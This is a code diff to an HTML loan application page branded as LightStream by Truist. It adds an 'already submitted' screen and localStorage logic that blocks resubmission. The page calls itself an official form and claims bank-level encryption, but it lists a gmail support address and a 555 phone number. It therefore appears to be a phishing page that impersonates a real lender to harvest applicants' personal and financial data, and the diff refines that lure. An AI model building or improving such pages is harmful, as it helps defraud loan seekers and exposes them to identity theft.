@@ -283,6 +283,49 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        .already-submitted {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+        .already-submitted.active {
+            display: block;
+        }
+        .warning-icon {
+            font-size: 80px;
+            color: #ffc107;
+            animation: shake 0.5s ease-out;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+        .already-title {
+            font-size: 28px;
+            color: #856404;
+            font-weight: 700;
+            margin: 20px 0 10px 0;
+        }
+        .already-message {
+            font-size: 16px;
+            color: #666;
+            margin: 15px 0;
+            line-height: 1.6;
+        }
+        .already-box {
+            background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
+            border: 2px solid #ffc107;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 25px 0;
+        }
+        .already-box p {
+            margin: 8px 0;
+            color: #856404;
+            font-weight: 600;
+            font-size: 16px;
+        }
     </style>
 </head>
 <body>
@@ -487,6 +530,28 @@
 
     <div class="loader" id="loader"></div>
 
+    <!-- Already Submitted Page -->
+    <div class="already-submitted" id="alreadySubmitted">
+        <div class="warning-icon">⚠</div>
+        <h1 class="already-title">Application Already Submitted!</h1>
+        <p class="already-message">You have already submitted your loan application.</p>
+        
+        <div class="already-box">
+            <p>📋 Your Application ID: <span id="existingAppId" style="color: #28a745;"></span></p>
+            <p>✅ Application Status: Under Review</p>
+            <p>📧 Check your email for confirmation</p>
+        </div>
+        
+        <p class="already-message" style="color: #dc3545; font-weight: 600;">
+            ⚠️ Multiple submissions are not allowed
+        </p>
+        <p style="color: #888; font-size: 14px; margin-top: 30px;">
+            For assistance, contact us at:<br>
+            📧 lightstreambytruist.llc.org@gmail.com<br>
+            📞 1-800-555-0199
+        </p>
+    </div>
+
     <div class="disclaimer">
         <p><strong>Disclaimer:</strong> This is an official loan application form. By submitting, you agree to our <a href="#" onclick="alert('Terms: Data will be processed securely and used only for loan application purposes.'); return false;">Terms of Service</a> and <a href="#" onclick="alert('Privacy: Your information is protected with bank-level encryption.'); return false;">Privacy Policy</a>.</p>
         <p style="margin-top: 8px;">© 2025 LightStream by Truist. All rights reserved.</p>
@@ -499,8 +564,28 @@
     </div>
 
     <script>
+        // Check if form already submitted on page load
+        window.addEventListener('DOMContentLoaded', function() {
+            const submittedAppId = localStorage.getItem('loanAppId');
+            if (submittedAppId) {
+                // Hide form and show already submitted page
+                document.querySelector('form').style.display = 'none';
+                document.querySelector('.disclaimer').style.display = 'none';
+                document.querySelector('.footer-links').style.display = 'none';
+                document.getElementById('alreadySubmitted').classList.add('active');
+                document.getElementById('existingAppId').textContent = submittedAppId;
+            }
+        });
+
         // Form validation and spam protection
         function validateForm() {
+            // Check if already submitted
+            const submittedAppId = localStorage.getItem('loanAppId');
+            if (submittedAppId) {
+                alert('You have already submitted an application. Application ID: ' + submittedAppId);
+                return false;
+            }
+
             // Check honeypot field (should be empty)
             const honeypot = document.querySelector('input[name="website"]');
             if (honeypot && honeypot.value !== '') {
@@ -544,6 +629,10 @@
                 // Generate random application ID
                 const appId = 'LS' + Date.now().toString().slice(-8);
                 document.getElementById('appId').textContent = appId;
+                
+                // Store application ID in localStorage to prevent resubmission
+                localStorage.setItem('loanAppId', appId);
+                localStorage.setItem('submissionDate', new Date().toISOString());
             })
             .catch(error => {
                 document.getElementById('loader').style.display = 'none';
